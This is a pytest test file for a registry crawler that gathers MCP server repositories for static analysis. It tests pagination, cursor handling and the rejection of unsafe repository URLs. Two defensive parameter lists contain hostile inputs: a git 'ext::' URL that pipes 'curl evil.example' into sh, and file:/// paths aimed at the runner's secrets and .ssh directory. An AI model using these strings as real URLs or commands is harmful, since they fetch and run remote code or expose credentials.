import copy
import json
from collections.abc import Callable
from pathlib import Path

import pytest

from analyzer.crawler.registry import (
    JsonObject,
    RegistryError,
    ServerRecord,
    crawl_registry,
    iter_servers,
    permits_cloning,
)

# A verbatim capture of the live registry, trimmed to four entries covering the
# shapes that matter: two GitHub repositories, one GitLab, and one hosted
# server with no repository at all. Captured rather than invented because the
# plan's assumed shape was wrong in five separate ways, and only real payloads
# would have shown that.
REGISTRY_PAGE: JsonObject = json.loads(
    (Path(__file__).parent / "data" / "registry_page.json").read_text(encoding="utf-8")
)


def _one_page(payload: JsonObject) -> Callable[[str], JsonObject]:
    """A fetch that serves one page and then reports no more.

    Dependency injection rather than a mock: the real `http_fetch` arrives in
    Task 2 with this exact signature, and nothing here touches the network.
    """
    ended = {**payload, "metadata": {**payload.get("metadata", {}), "nextCursor": None}}

    def fetch(url: str) -> JsonObject:
        return ended

    return fetch


def test_a_real_registry_entry_becomes_a_server_record() -> None:
    records = list(iter_servers(_one_page(REGISTRY_PAGE)))

    assert records[0] == ServerRecord(
        server_id="ac.tandem/docs-mcp",
        repo_url="https://github.com/frumu-ai/tandem",
        discovered_via="registry",
    )


def _page_with_repo_url(url: str) -> JsonObject:
    """A real entry with only its repository URL swapped.

    Built from the captured payload rather than written by hand, so the
    surrounding structure stays authentic and the test cannot pass because of
    a shape the registry never produces.
    """
    entry = copy.deepcopy(REGISTRY_PAGE["servers"][0])
    entry["server"]["repository"]["url"] = url
    return {"servers": [entry], "metadata": {"nextCursor": None}}


def test_hosted_servers_with_no_repository_are_skipped() -> None:
    """About a third of the registry is servers reached over HTTP.

    They carry `remotes` and no repository, so a static analyser has nothing
    to read. Skipping them is the ordinary case, not an error.
    """
    records = list(iter_servers(_one_page(REGISTRY_PAGE)))

    assert [r.server_id for r in records] == [
        "ac.tandem/docs-mcp",
        "agency.goji/goji",
        "ai.feedback1/mcp",
    ]
    assert "ac.inference.sh/mcp" not in [r.server_id for r in records]


def test_repositories_are_not_assumed_to_be_on_github() -> None:
    """The sample held two GitHub repositories and one GitLab."""
    records = list(iter_servers(_one_page(REGISTRY_PAGE)))

    assert any(r.repo_url.startswith("https://gitlab.com/") for r in records)


@pytest.mark.parametrize(
    "url",
    [
        "http://github.com/owner/repo",  # plaintext
        "file:///home/runner/work/secrets",  # the security review's finding
        "ext::sh -c 'curl evil.example | sh'",  # git executes this
        "git://github.com/owner/repo",  # GIT_PROXY_COMMAND runs
        "ssh://git@github.com/owner/repo",
    ],
)
def test_a_repository_url_that_is_not_https_is_skipped(url: str) -> None:
    """Anyone can publish to the registry, so its URLs are hostile input.

    The fetcher permits `file:` so its own tests can clone local repositories,
    which means a `file:///` entry here would have it pull a repository off the
    runner's own disk and publish those paths under the attacker's server_id.
    The trust boundary is where the data enters, which is here.

    These are all real URLs using a transport we will not accept, which is a
    fact about one server. An empty or absent url is different: the registry
    is claiming a repository and then declining to say where, which is the
    response contradicting itself. That case raises, and is covered below.
    """
    assert list(iter_servers(_one_page(_page_with_repo_url(url)))) == []


def _recording_fetch(pages: list[JsonObject]) -> tuple[list[str], Callable[[str], JsonObject]]:
    """Serve the given pages in order, recording every URL requested."""
    urls: list[str] = []

    def fetch(url: str) -> JsonObject:
        urls.append(url)
        return pages[min(len(urls) - 1, len(pages) - 1)]

    return urls, fetch


def test_only_the_latest_version_of_each_server_is_requested() -> None:
    """The registry returns every version of every server.

    Measured over 600 live entries: 190 distinct servers, so the rest are
    older versions. Without this the scanner would clone and scan each server
    about three times a night for nothing. The API can deduplicate server
    side, which is cheaper than paging through duplicates to discard them.
    """
    urls, fetch = _recording_fetch([{"servers": [], "metadata": {"nextCursor": None}}])

    list(iter_servers(fetch))

    assert "version=latest" in urls[0]


def test_a_cursor_is_url_encoded_before_it_is_requested() -> None:
    """Real cursors are opaque strings containing / and :.

    A live example is `ac.snag/snag:1.0.0`. Pasted into a query string raw,
    those characters change what the URL means.
    """
    urls, fetch = _recording_fetch(
        [
            {"servers": [], "metadata": {"nextCursor": "ac.snag/snag:1.0.0"}},
            {"servers": [], "metadata": {"nextCursor": None}},
        ]
    )

    list(iter_servers(fetch))

    assert len(urls) == 2
    assert "ac.snag%2Fsnag%3A1.0.0" in urls[1]
    assert "ac.snag/snag:1.0.0" not in urls[1]


def test_pagination_follows_the_cursor_until_it_runs_out() -> None:
    first = copy.deepcopy(REGISTRY_PAGE)
    first["metadata"] = {"nextCursor": "page-two"}
    second = {"servers": [copy.deepcopy(REGISTRY_PAGE["servers"][1])], "metadata": {"nextCursor": None}}
    _, fetch = _recording_fetch([first, second])

    records = list(iter_servers(fetch))

    assert [r.server_id for r in records] == [
        "ac.tandem/docs-mcp",
        "agency.goji/goji",
        "ai.feedback1/mcp",
        "agency.goji/goji",
    ]


def test_a_repeated_cursor_is_caught_immediately_not_after_max_pages() -> None:
    """A looping cursor is detectable outright, so it should not need a limit.

    Catching it by page count means hundreds of pointless requests first, and
    only works if the limit is below the registry's real size, which is a
    moving target: the limit was 200 pages until a live crawl passed 20,000
    entries with the cursor advancing correctly.
    """
    urls, fetch = _recording_fetch([{"servers": [], "metadata": {"nextCursor": "same"}}])

    with pytest.raises(RegistryError, match="looping"):
        list(iter_servers(fetch, max_pages=500))

    assert len(urls) == 2, "caught on the repeat, not by exhausting the limit"


def test_max_pages_still_backstops_a_cursor_that_never_repeats() -> None:
    """A cursor that changes every time but never ends is not a loop.

    Nothing detects that except a limit, so the limit stays as a backstop, and
    hitting it is an error rather than a quiet truncation.
    """
    pages = [{"servers": [], "metadata": {"nextCursor": f"c{i}"}} for i in range(10)]
    urls, fetch = _recording_fetch(pages)

    with pytest.raises(RegistryError, match="max_pages"):
        list(iter_servers(fetch, max_pages=3))

    assert len(urls) == 3


def test_a_payload_with_no_server_list_is_an_error_not_an_empty_result() -> None:
    """Returning nothing quietly is the dangerous failure here.

    If the registry changes shape or hands back an error document, a crawler
    that yields zero servers looks exactly like a healthy crawl of an empty
    ecosystem, and the pipeline would publish that. Structure is the
    registry's contract; a break in it stops the run.
    """
    _, fetch = _recording_fetch([{"error": "service unavailable"}])

    with pytest.raises(RegistryError, match="servers"):
        list(iter_servers(fetch))


@pytest.mark.parametrize(
    ("entry", "because"),
    [
        ({}, "no server key"),
        ({"server": {}}, "no name"),
    ],
)
def test_a_structurally_broken_entry_stops_the_run(entry: JsonObject, because: str) -> None:
    """Structure is the registry's contract; content is data.

    A missing repository or a non-https URL is a fact about one server and is
    skipped. A missing `server` key or a repository with no `url` means the
    response is not shaped the way it was, which almost certainly means every
    entry is wrong, not one. Skipping those quietly would scan nothing and
    report an empty ecosystem.
    """
    _, fetch = _recording_fetch([{"servers": [entry], "metadata": {"nextCursor": None}}])

    with pytest.raises(RegistryError):
        list(iter_servers(fetch))


def test_a_page_without_metadata_is_treated_as_the_last_page() -> None:
    """Absent pagination is a legitimate shape, not a broken one."""
    page = {"servers": [copy.deepcopy(REGISTRY_PAGE["servers"][0])]}
    _, fetch = _recording_fetch([page])

    records = list(iter_servers(fetch))

    assert [r.server_id for r in records] == ["ac.tandem/docs-mcp"]


@pytest.mark.parametrize("url", [12345, ["https://github.com/a/b"], {"href": "x"}, None])
def test_a_repository_url_that_is_not_a_string_is_skipped(url: object) -> None:
    """Anyone can publish to the registry, so the type is not guaranteed.

    A list or an integer reached urlparse and raised AttributeError, so one
    crafted entry ended the crawl with a bare traceback. Skipped now, like
    every other repository we cannot turn into a URL.
    """
    entry = copy.deepcopy(REGISTRY_PAGE["servers"][0])
    entry["server"]["repository"]["url"] = url
    _, fetch = _recording_fetch([{"servers": [entry], "metadata": {"nextCursor": None}}])

    assert list(iter_servers(fetch)) == []


@pytest.mark.parametrize("repository", [{}, {"source": "github"}, {"url": ""}, None, "x"])
def test_a_repository_with_no_usable_url_is_skipped(repository: object) -> None:
    """Every way of having no url means the same thing, so all behave alike.

    A dict with no url key is not hypothetical: 50 of 2000 live entries are
    exactly that. An earlier version treated it as a broken response and broke
    against the real registry on the first run.
    """
    entry = copy.deepcopy(REGISTRY_PAGE["servers"][0])
    entry["server"]["repository"] = repository
    _, fetch = _recording_fetch([{"servers": [entry], "metadata": {"nextCursor": None}}])

    assert list(iter_servers(fetch)) == []


def test_a_null_metadata_block_is_treated_as_the_last_page() -> None:
    """A common shape for "no more pages", and it used to crash.

    Every other payload access here is guarded; this one assumed a dict and
    raised AttributeError after the page's records had already been yielded.
    """
    page = {"servers": [copy.deepcopy(REGISTRY_PAGE["servers"][0])], "metadata": None}
    _, fetch = _recording_fetch([page])

    assert [r.server_id for r in iter_servers(fetch)] == ["ac.tandem/docs-mcp"]


def test_a_cursor_that_is_not_a_string_stops_the_run() -> None:
    _, fetch = _recording_fetch([{"servers": [], "metadata": {"nextCursor": 42}}])

    with pytest.raises(RegistryError, match="cursor"):
        list(iter_servers(fetch))


def test_a_crawl_reports_what_it_skipped() -> None:
    """Silently dropped entries cannot be published as coverage.

    Roughly a third of the registry is hosted servers with no source to read.
    That is the ordinary case rather than an error, but a coverage claim that
    does not say how many entries were never eligible is a claim about a
    denominator nobody can see.
    """
    crawl = crawl_registry(_one_page(REGISTRY_PAGE))

    assert crawl.entries_seen == 4
    assert crawl.skipped_without_source == 1
    assert [record.server_id for record in crawl.records] == [
        "ac.tandem/docs-mcp",
        "agency.goji/goji",
        "ai.feedback1/mcp",
    ]


def test_skipping_counts_every_unusable_repository_shape() -> None:
    """Absent, null, not a dict, no url, empty url and non-https all count.

    A live crawl of 2,000 entries held 50 repositories that are a dict with no
    url key, so these are ordinary records rather than hypotheticals.
    """
    page = {
        "servers": [
            {"server": {"name": "a/none"}},
            {"server": {"name": "b/null", "repository": None}},
            {"server": {"name": "c/notdict", "repository": "https://github.com/x/y"}},
            {"server": {"name": "d/nourl", "repository": {}}},
            {"server": {"name": "e/empty", "repository": {"url": ""}}},
            {"server": {"name": "f/ssh", "repository": {"url": "git@github.com:x/y"}}},
            {"server": {"name": "g/ok", "repository": {"url": "https://github.com/x/y"}}},
        ],
        "metadata": {"nextCursor": None},
    }

    crawl = crawl_registry(lambda url: page)

    assert crawl.entries_seen == 7
    assert crawl.skipped_without_source == 6
    assert len(crawl.records) == 1


@pytest.mark.parametrize(
    "url",
    [
        "http://github.com/owner/repo",
        "file:///home/runner/.ssh",
        "ext::sh -c 'curl evil.example | sh'",
        "git://github.com/owner/repo",
        "ssh://git@github.com/owner/repo",
        "",
    ],
)
def test_a_record_cannot_be_built_with_a_url_the_fetcher_must_not_clone(url: str) -> None:
    """The scheme rule belongs to the record, not to one of its producers.

    It lived in the registry parser, which protected the registry and nothing
    else. `load_server_index` reads records from a file and reaches the same
    fetcher, so a hand-edited index was a second way in with no check on it at
    all. Validating at construction covers every producer, including ones not
    written yet.
    """
    with pytest.raises(ValueError, match="https"):
        ServerRecord(server_id="attacker/controlled", repo_url=url, discovered_via="registry")


def test_the_registry_skips_what_the_record_would_refuse() -> None:
    """One rule, two behaviours, and they have to agree.

    A non-https entry is a fact about one server and is skipped rather than
    fatal, so the parser asks the same question the constructor does instead of
    carrying its own copy of the answer. If the two ever disagree the crawl
    dies on a record it used to skip.
    """
    assert not permits_cloning("file:///home/runner/.ssh")
    assert permits_cloning("https://github.com/owner/repo")
